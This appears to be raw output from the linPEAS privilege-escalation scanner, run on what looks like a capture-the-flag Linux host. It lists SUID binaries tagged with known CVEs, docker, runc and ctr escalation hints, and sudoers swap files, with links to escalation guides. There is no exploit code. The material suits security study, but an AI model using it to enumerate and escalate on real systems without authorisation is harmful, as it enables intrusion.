-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 apaar apaar 4096 Oct  3  2020 /home/apaar/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)
-rw------- 1 root root 12288 Oct  3  2020 /etc/.sudoers.swp                                                                                                                                                                                 

-rw------- 1 apaar apaar 817 Oct  3  2020 /home/apaar/.viminfo

╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation                                                                                                                                      
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it                                                                                                                                                               
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation                                                                                                                                                
runc was found in /usr/bin/runc, you may be able to escalate privileges with it                                                                                                                                                             

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation                                                                                                                     
lrwxrwxrwx 1 root root 33 Oct  3  2020 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket                                                                                                          
total 0
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_merged
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_merged_recursive
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_queued
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_queued_recursive
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_service_bytes
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_service_bytes_recursive
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_service_time
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_service_time_recursive
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_serviced
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_serviced_recursive
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_wait_time
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.io_wait_time_recursive
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.leaf_weight
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.leaf_weight_device
--w------- 1 root root 0 Nov  3 08:05 blkio.reset_stats
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.sectors
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.sectors_recursive
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.throttle.io_service_bytes
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.throttle.io_serviced
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.throttle.read_bps_device
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.throttle.read_iops_device
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.throttle.write_bps_device
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.throttle.write_iops_device
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.time
-r--r--r-- 1 root root 0 Nov  3 08:05 blkio.time_recursive
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.weight
-rw-r--r-- 1 root root 0 Nov  3 08:05 blkio.weight_device
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  3 08:05 notify_on_release
-rw-r--r-- 1 root root 0 Nov  3 08:05 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  3 08:05 cpu.cfs_period_us
-rw-r--r-- 1 root root 0 Nov  3 08:05 cpu.cfs_quota_us
-rw-r--r-- 1 root root 0 Nov  3 08:05 cpu.shares
-r--r--r-- 1 root root 0 Nov  3 08:05 cpu.stat
-r--r--r-- 1 root root 0 Nov  3 08:05 cpuacct.stat
-rw-r--r-- 1 root root 0 Nov  3 08:05 cpuacct.usage
-r--r--r-- 1 root root 0 Nov  3 08:05 cpuacct.usage_all
-r--r--r-- 1 root root 0 Nov  3 08:05 cpuacct.usage_percpu
-r--r--r-- 1 root root 0 Nov  3 08:05 cpuacct.usage_percpu_sys
-r--r--r-- 1 root root 0 Nov  3 08:05 cpuacct.usage_percpu_user
-r--r--r-- 1 root root 0 Nov  3 08:05 cpuacct.usage_sys
-r--r--r-- 1 root root 0 Nov  3 08:05 cpuacct.usage_user
-rw-r--r-- 1 root root 0 Nov  3 08:05 notify_on_release
-rw-r--r-- 1 root root 0 Nov  3 08:05 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.procs
--w------- 1 root root 0 Nov  3 08:05 devices.allow
--w------- 1 root root 0 Nov  3 08:05 devices.deny
-r--r--r-- 1 root root 0 Nov  3 08:05 devices.list
-rw-r--r-- 1 root root 0 Nov  3 08:05 notify_on_release
-rw-r--r-- 1 root root 0 Nov  3 08:05 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.clone_children
--w--w--w- 1 root root 0 Nov  3 08:05 cgroup.event_control
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.failcnt
--w------- 1 root root 0 Nov  3 08:05 memory.force_empty
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.failcnt
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.limit_in_bytes
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.max_usage_in_bytes
-r--r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.slabinfo
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.tcp.failcnt
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.tcp.limit_in_bytes
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.tcp.max_usage_in_bytes
-r--r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.tcp.usage_in_bytes
-r--r--r-- 1 root root 0 Nov  3 08:05 memory.kmem.usage_in_bytes
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.limit_in_bytes
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.max_usage_in_bytes
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.move_charge_at_immigrate
-r--r--r-- 1 root root 0 Nov  3 08:05 memory.numa_stat
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.oom_control
---------- 1 root root 0 Nov  3 08:05 memory.pressure_level
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.soft_limit_in_bytes
-r--r--r-- 1 root root 0 Nov  3 08:05 memory.stat
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.swappiness
-r--r--r-- 1 root root 0 Nov  3 08:05 memory.usage_in_bytes
-rw-r--r-- 1 root root 0 Nov  3 08:05 memory.use_hierarchy
-rw-r--r-- 1 root root 0 Nov  3 08:05 notify_on_release
-rw-r--r-- 1 root root 0 Nov  3 08:05 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  3 08:05 notify_on_release
-rw-r--r-- 1 root root 0 Nov  3 08:05 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  3 08:05 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  3 08:05 notify_on_release
-r--r--r-- 1 root root 0 Nov  3 08:05 pids.current
-r--r--r-- 1 root root 0 Nov  3 08:05 pids.events
-rw-r--r-- 1 root root 0 Nov  3 08:05 pids.max
-rw-r--r-- 1 root root 0 Nov  3 08:05 tasks
-rw-r--r-- 1 root root 0 Oct  3  2020 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                                                                            

-rw-r--r-- 1 root root 69 May 26  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 May 26  2020 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind                                                                                                                                                         
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                                                                            





















lrwxrwxrwx 1 root root 20 Oct  3  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Oct  3  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Oct  3  2020 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 /home/apaar/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 apaar apaar 807 Oct  3  2020 /home/apaar/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
strings Not Found                                                                                                                                                                                                                           
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign                                                                                                                                                                       
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter                                                                                                                                                         
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                                                                                    
/etc/ld.so.conf                                                                                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 26245 Jul 10  2020 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1793 Jul 20  2020 usr.sbin.mysqld
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                                                                     
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2022-11-03+08:05:50.6121904810 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control                                                                                                                        
2022-11-03+08:05:50.6096229840 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
2022-11-03+08:05:50.6069738760 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
2022-11-03+08:05:50.6045019110 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
2022-11-03+08:05:50.6019385130 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
2022-11-03+08:05:50.5993650880 /var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/cgroup.event_control
2022-11-03+08:05:50.5968815630 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
2022-11-03+08:05:50.5943045410 /var/lib/lxcfs/cgroup/memory/system.slice/docker.socket/cgroup.event_control
2022-11-03+08:05:50.5918553800 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
2022-11-03+08:05:50.5892650080 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
2022-11-03+08:05:50.5867176050 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
2022-11-03+08:05:50.5842867380 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
2022-11-03+08:05:50.5817415070 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
2022-11-03+08:05:50.5791691900 /var/lib/lxcfs/cgroup/memory/system.slice/vsftpd.service/cgroup.event_control
2022-11-03+08:05:50.5767271230 /var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
2022-11-03+08:05:50.5741668440 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
2022-11-03+08:05:50.5714475760 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
2022-11-03+08:05:50.5689811160 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
2022-11-03+08:05:50.5663911990 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
2022-11-03+08:05:50.5639342590 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
2022-11-03+08:05:50.5613558130 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
2022-11-03+08:05:50.5588006360 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
2022-11-03+08:05:50.5563371870 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
2022-11-03+08:05:50.5537503840 /var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
2022-11-03+08:05:50.5511819130 /var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
2022-11-03+08:05:50.5487021750 /var/lib/lxcfs/cgroup/memory/system.slice/docker.service/cgroup.event_control
2022-11-03+08:05:50.5461064110 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
2022-11-03+08:05:50.5435153910 /var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
2022-11-03+08:05:50.5410348760 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
2022-11-03+08:05:50.5384461800 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
2022-11-03+08:05:50.5359669320 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
2022-11-03+08:05:50.5333946180 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
2022-11-03+08:05:50.5306830840 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
2022-11-03+08:05:50.5271449160 /var/lib/lxcfs/cgroup/memory/system.slice/containerd.service/cgroup.event_control
2022-11-03+08:05:50.5236822980 /var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
2022-11-03+08:05:50.5201247840 /var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
2022-11-03+08:05:50.5165813600 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
2022-11-03+08:05:50.5129032080 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
2022-11-03+08:05:50.5094449820 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
2020-10-04+14:11:38.1972182060 /home/apaar/.helpline.sh
2020-10-03+03:40:04.7880069630 /etc/console-setup/cached_setup_terminal.sh
2020-10-03+03:40:04.7880069630 /etc/console-setup/cached_setup_keyboard.sh
2020-10-03+03:40:04.7880069630 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                                                                                                    
drwxr-xr-x  3 root root 4096 Oct  3  2020 .
drwxr-xr-x 24 root root 4096 Oct  3  2020 ..
drwx--x--x  4 root root 4096 Oct  3  2020 containerd

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                                                                                                                                 
/initrd.img.old
/swap.img
/vmlinuz.old
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                                                           
total 36                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Aug  6  2020 .
drwxr-xr-x 98 root root 4096 Oct  5  2020 ..
-rw-r--r--  1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root 3417 Jun  3  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x  1 root root  873 Jun  3  2020 Z99-cloudinit-warnings.sh
-rw-r--r--  1 root root  825 Jul 10  2020 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/root/
/var/www
/var/www/html
/var/www/html/team.html
/var/www/html/contact.html
/var/www/html/blog.html
/var/www/html/contact.php
/var/www/html/preview_img
/var/www/html/preview_img/preview.jpg
/var/www/html/css
/var/www/html/css/bootstrap-theme.min.css.map
/var/www/html/css/bootstrap-theme.css
/var/www/html/css/owl.carousel.css
/var/www/html/css/bootstrap.css
/var/www/html/css/flaticon.css
/var/www/html/css/bootstrap.min.css
/var/www/html/css/3dslider.css
/var/www/html/css/font-awesome.min.css
/var/www/html/css/prettyPhoto.css
/var/www/html/css/bootstrap-theme.min.css
/var/www/html/css/font-awesome.css
/var/www/html/css/animate.css
/var/www/html/css/bootstrap.css.map
/var/www/html/css/bootstrap-theme.css.map
/var/www/html/css/responsive.css
/var/www/html/css/custom.css
/var/www/html/css/bootstrap.min.css.map
/var/www/html/single-blog.html
/var/www/html/index.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                                                                                                            
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                                                            
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog                                                                                                                                                                                                                             
/var/log/journal/798fcd76739440de8c586719da062c3f/system.journal
/var/log/auth.log
/var/log/kern.log

logrotate 3.11.0

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Files inside others home (limit 20)
/home/apaar/.ssh/authorized_keys                                                                                                                                                                                                            
/home/apaar/.bash_logout
/home/apaar/.bashrc
/home/apaar/.viminfo
/home/apaar/.bash_history
/home/apaar/.helpline.sh
/home/apaar/local.txt
/home/apaar/.profile
/var/www/html/team.html
/var/www/html/contact.html
/var/www/html/blog.html
/var/www/html/contact.php
/var/www/html/preview_img/preview.jpg
/var/www/html/css/bootstrap-theme.min.css.map
/var/www/html/css/bootstrap-theme.css
/var/www/html/css/owl.carousel.css
/var/www/html/css/bootstrap.css
/var/www/html/css/flaticon.css
/var/www/html/css/bootstrap.min.css
/var/www/html/css/3dslider.css
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 7905 Sep  8  2020 /lib/modules/4.15.0-118-generic/kernel/drivers/net/team/team_mode_activebackup.ko                                                                                                                  
-rw-r--r-- 1 root root 7857 Sep  8  2020 /lib/modules/4.15.0-118-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 0 Sep  8  2020 /usr/src/linux-headers-4.15.0-118-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Sep  8  2020 /usr/src/linux-headers-4.15.0-118-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217480 Sep  8  2020 /usr/src/linux-headers-4.15.0-118-generic/.config.old
-rw-r--r-- 1 root root 11755 Oct  3  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1397 Aug  6  2020 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission                                                                                                                                                                         


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 16K
drwxr-xr-x  4 root root 4.0K Oct  3  2020 .
drwxr-xr-x 14 root root 4.0K Oct  3  2020 ..
drwxr-xr-x  3 root root 4.0K Oct  3  2020 files
drwxr-xr-x  8 root root 4.0K Oct  3  2020 html

/var/www/files:
total 28K
drwxr-xr-x 3 root root 4.0K Oct  3  2020 .

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 1531 Oct  3  2020 /etc/apparmor.d/cache/.features                                                                                                                                                                    
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw------- 1 root root 12288 Oct  4  2020 /etc/.sudoers.swo
-rw------- 1 root root 0 Aug  6  2020 /etc/.pwd.lock
-rw-r--r-- 1 apaar apaar 220 Oct  3  2020 /home/apaar/.bash_logout
-rwxrwxr-x 1 apaar apaar 286 Oct  4  2020 /home/apaar/.helpline.sh
-rw-r--r-- 1 root root 20 Nov  3 07:31 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Nov  3 07:30 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 landscape landscape 0 Aug  6  2020 /var/lib/landscape/.cleanup.user

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 207 Oct  3  2020 /var/backups/dpkg.statoverride.0                                                                                                                                                                    
-rw-r--r-- 1 root root 572747 Oct  3  2020 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 51200 Oct  3  2020 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 32630 Oct  3  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 437 Oct  3  2020 /var/backups/dpkg.diversions.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
